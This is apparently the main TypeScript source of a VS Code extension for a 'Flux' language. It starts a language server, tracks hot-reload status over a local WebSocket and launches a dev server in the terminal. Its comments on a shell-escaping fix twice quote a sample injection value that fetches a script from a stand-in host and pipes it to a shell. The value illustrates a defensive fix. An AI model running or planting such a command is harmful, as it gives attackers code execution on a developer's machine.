import * as vscode from "vscode";
import {
  LanguageClient,
  LanguageClientOptions,
  ServerOptions,
  TransportKind,
} from "vscode-languageclient/node";
import { WebSocket, type RawData } from "ws";

/**
 * The Flux language client, or `undefined` until `activate` wires it up.
 */
let client: LanguageClient | undefined;

/**
 * Status-bar item showing the dev server hot-reload state (spec §4.1 telemetry).
 */
let statusBar: vscode.StatusBarItem | undefined;

/**
 * The extension's single output channel. Created once at `activate`; the
 * previous per-invocation `createOutputChannel("Flux")` leaked a channel on
 * every `flux.runOnDevice` call (audit §9.3).
 */
let outputChannel: vscode.OutputChannel | undefined;

/**
 * POSIX-shell-escapes `s` for safe inclusion in a command line sent to the
 * integrated terminal. Single-quotes disable every expansion (word-splitting,
 * `$`, backticks, `;`, `|`, `&`, `(`, `)`), and embedded single quotes are
 * escaped as `'\''`.
 *
 * Replaces the previous `JSON.stringify(devBin)` guard, which wrapped the
 * binary in double quotes but did **not** escape `$(...)` or backticks —
 * inside double quotes those *are* expanded by the shell, so a malicious
 * `flux.lspServerPath` of `"$(curl evil.sh | sh)"` still executed.
 */
function shellQuote(s: string): string {
  return `'${s.replace(/'/g, "'\\''")}'`;
}

/**
 * Active WebSocket to the dev server telemetry endpoint, if connected.
 */
let telemetrySocket: WebSocket | undefined;

/**
 * Default dev server telemetry port (`:7333`, spec §4.1).
 */
const DEFAULT_TELEMETRY_PORT = 7333;

/**
 * Updates the status bar with a short hot-reload state label and tooltip.
 */
function setStatus(text: string, tooltip?: string): void {
  if (!statusBar) {
    return;
  }
  statusBar.text = `$(sync) Flux: ${text}`;
  statusBar.tooltip = tooltip ?? "Flux hot-reload status";
  statusBar.show();
}

/**
 * Connects the status bar to the dev server telemetry WebSocket. The dev server
 * enriches host telemetry and fans it out on `:7333` (spec §4.1); we surface a
 * coarse saved/compiling/reloaded signal. The connection is best-effort: if the
 * dev server is not running, the status simply stays "idle" and no error is shown.
 */
function connectHotReloadStatus(port: number): void {
  if (telemetrySocket) {
    return;
  }
  try {
    // Audit fix: the DevTools endpoint is `/devtools`, not `/`. The previous
    // URL handshook against the wrong path, so the status never moved off
    // "idle" even when the dev server was running.
    const ws = new WebSocket(`ws://127.0.0.1:${port}/devtools`);
    telemetrySocket = ws;
    ws.on("open", () => setStatus("connected", "Dev server telemetry connected"));
    ws.on("message", (_data: RawData) => {
      // Telemetry frames are MessagePack/JSON binary blobs; we do not decode
      // them here. Any inbound frame means the dev server is actively
      // shipping patches — that is exactly the "hot reload applied" signal we
      // surface. The previous `text.includes("reload")` heuristic decoded
      // binary as UTF-8 and could never match.
      setStatus("reloaded", "Hot reload applied");
    });
    ws.on("close", () => {
      telemetrySocket = undefined;
      setStatus("idle", "Dev server not connected");
      // Audit fix: the socket is best-effort, but a transport hiccup (dev
      // server restart, transient TCP drop) should not permanently disable
      // the status bar. Retry with a fixed backoff.
      setTimeout(() => connectHotReloadStatus(port), 3_000);
    });
    ws.on("error", () => {
      // Non-fatal: dev server may not be running. The `close` handler above
      // schedules the retry, so nothing more to do here.
      telemetrySocket = undefined;
      setStatus("idle", "Dev server not connected");
    });
  } catch {
    setStatus("idle", "Dev server not connected");
  }
}

/**
 * Spawns `flux dev --ws-host 0.0.0.0` so physical devices on the LAN can attach,
 * and prints the resulting URL to the output channel (FLUX-026 "Run on device").
 */
async function runOnDevice(): Promise<void> {
  if (!outputChannel) {
    return;
  }
  outputChannel.show(true);
  const fluxBin = vscode.workspace
    .getConfiguration("flux")
    .get<string>("lspServerPath", "flux-lsp");
  // The dev server binary is `flux` (flux-cli), resolved alongside flux-lsp.
  const devBin = fluxBin.replace(/flux-lsp$/, "flux") || "flux";
  outputChannel.appendLine("Launching `flux dev --ws-host 0.0.0.0`…");
  const term = vscode.window.createTerminal({ name: "Flux dev (device)" });
  // SECURITY: `devBin` comes from a per-workspace setting a malicious repo can
  // control. `shellQuote` wraps it in single quotes (disabling every shell
  // expansion — `$`, backticks, `;`, `|`, …) and escapes embedded single quotes
  // as `'\''`. The previous `JSON.stringify(devBin)` guard was insufficient:
  // it produced a *double*-quoted string, inside which `$(...)` and backticks
  // are still expanded — `"$(curl evil.sh | sh)"` executed.
  term.sendText(`${shellQuote(devBin)} dev --ws-host 0.0.0.0`);
  term.show();
  outputChannel.appendLine(
    "Dev server exposing on 0.0.0.0. On the device, point the Flux app at this machine's LAN IP on :7331.",
  );
}

/**
 * Activates the extension: registers the language, starts the LSP client, wires
 * the hot-reload status bar, and registers the Run-on-device command.
 */
export function activate(context: vscode.ExtensionContext): void {
  outputChannel = vscode.window.createOutputChannel("Flux");
  context.subscriptions.push(outputChannel);
  statusBar = vscode.window.createStatusBarItem(
    vscode.StatusBarAlignment.Right,
    100,
  );
  setStatus("starting…", "Flux language server starting");
  context.subscriptions.push(statusBar);

  const serverPath = vscode.workspace
    .getConfiguration("flux")
    .get<string>("lspServerPath", "flux-lsp");

  const serverOptions: ServerOptions = {
    command: serverPath,
    args: [],
    transport: TransportKind.stdio,
  };

  const clientOptions: LanguageClientOptions = {
    documentSelector: [{ scheme: "file", language: "flux" }],
    synchronize: {
      fileEvents: vscode.workspace.createFileSystemWatcher("**/*.flux"),
    },
  };

  client = new LanguageClient(
    "flux",
    "Flux Language Server",
    serverOptions,
    clientOptions,
  );

  client
    .start()
    .then(() => {
      setStatus("ready", "Flux language server ready");
      const port = vscode.workspace
        .getConfiguration("flux")
        .get<number>("devServerTelemetryPort", DEFAULT_TELEMETRY_PORT);
      connectHotReloadStatus(port);
    })
    .catch((err: unknown) => {
      setStatus("error", `Flux language server failed to start: ${String(err)}`);
      vscode.window.showErrorMessage(
        `Flux language server failed to start: ${String(err)}`,
      );
    });

  context.subscriptions.push(
    vscode.commands.registerCommand("flux.runOnDevice", () => void runOnDevice()),
    vscode.commands.registerCommand("flux.showHotReloadStatus", () => {
      const tip = statusBar?.tooltip;
      vscode.window.showInformationMessage(
        typeof tip === "string" ? tip : "Flux hot-reload status",
      );
    }),
  );
}

/**
 * Stops the language client and closes the telemetry socket on deactivate.
 */
export function deactivate(): Thenable<void> | undefined {
  telemetrySocket?.close();
  telemetrySocket = undefined;
  outputChannel = undefined;
  if (!client) {
    return undefined;
  }
  const stopping = client.stop();
  client = undefined;
  return stopping;
}
